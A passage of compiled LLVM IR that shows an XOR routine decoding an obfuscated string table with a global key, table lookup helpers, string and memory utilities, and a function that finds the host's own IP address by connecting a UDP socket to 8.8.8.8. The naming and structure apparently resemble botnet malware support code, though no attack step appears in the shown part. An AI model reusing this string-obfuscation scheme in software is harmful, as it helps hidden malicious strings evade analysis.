  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

34:                                               ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

83:                                               ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27, !llvm.loop !44

86:                                               ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_lock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @table_retrieve_val(i32 noundef %0, i32* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [8 x %struct.table_value], [8 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

17:                                               ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strlen(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

4:                                                ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

10:                                               ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4, !llvm.loop !45

13:                                               ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strcpy(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = call i32 @util_strlen(i8* noundef %6)
  store i32 %7, i32* %5, align 4
  %8 = load i8*, i8** %3, align 8
  %9 = load i8*, i8** %4, align 8
  %10 = load i32, i32* %5, align 4
  %11 = add nsw i32 %10, 1
  call void @util_memcpy(i8* noundef %8, i8* noundef %9, i32 noundef %11)
  %12 = load i32, i32* %5, align 4
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_memcpy(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

11:                                               ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

15:                                               ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11, !llvm.loop !46

21:                                               ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_zero(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

7:                                                ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

11:                                               ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7, !llvm.loop !47

14:                                               ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_local_addr() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %6 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 0, i32* %2, align 4
  store i32 16, i32* %4, align 4
  %7 = call i32* @__errno_location() #10
  store i32 0, i32* %7, align 4
  %8 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 0) #11
  store i32 %8, i32* %2, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %0
  store i32 0, i32* %1, align 4
  br label %35

11:                                               ; preds = %0
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %12, align 4
  %13 = call i32 @htonl(i32 noundef 134744072) #10
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %15 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %14, i32 0, i32 0
  store i32 %13, i32* %15, align 4
  %16 = call zeroext i16 @htons(i16 noundef zeroext 53) #10
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = load i32, i32* %2, align 4
  %19 = bitcast %union.__CONST_SOCKADDR_ARG* %5 to %struct.sockaddr**
  %20 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %20, %struct.sockaddr** %19, align 8
  %21 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %5, i32 0, i32 0
  %22 = load %struct.sockaddr*, %struct.sockaddr** %21, align 8
  %23 = call i32 @connect(i32 noundef %18, %struct.sockaddr* %22, i32 noundef 16)
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %union.__CONST_SOCKADDR_ARG* %6 to %struct.sockaddr**
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %26, %struct.sockaddr** %25, align 8
  %27 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %6, i32 0, i32 0
  %28 = load %struct.sockaddr*, %struct.sockaddr** %27, align 8
  %29 = call i32 @getsockname(i32 noundef %24, %struct.sockaddr* %28, i32* noundef %4) #11
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @close(i32 noundef %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %33 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 4
  store i32 %34, i32* %1, align 4
  br label %35

35:                                               ; preds = %11, %10
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

; Function Attrs: nounwind
declare i32 @getsockname(i32 noundef, %struct.sockaddr*, i32* noundef) #2

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn }
attributes #4 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { nounwind }
attributes #12 = { nounwind readonly willreturn }
attributes #13 = { noreturn }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
!31 = distinct !{!31, !7}
!32 = distinct !{!32, !7}
!33 = distinct !{!33, !7}
!34 = distinct !{!34, !7}
!35 = distinct !{!35, !7}
!36 = distinct !{!36, !7}
!37 = distinct !{!37, !7}
!38 = distinct !{!38, !7}
!39 = distinct !{!39, !7}
!40 = distinct !{!40, !7}
!41 = distinct !{!41, !7}
!42 = distinct !{!42, !7}
!43 = distinct !{!43, !7}
!44 = distinct !{!44, !7}
!45 = distinct !{!45, !7}
!46 = distinct !{!46, !7}
!47 = distinct !{!47, !7}
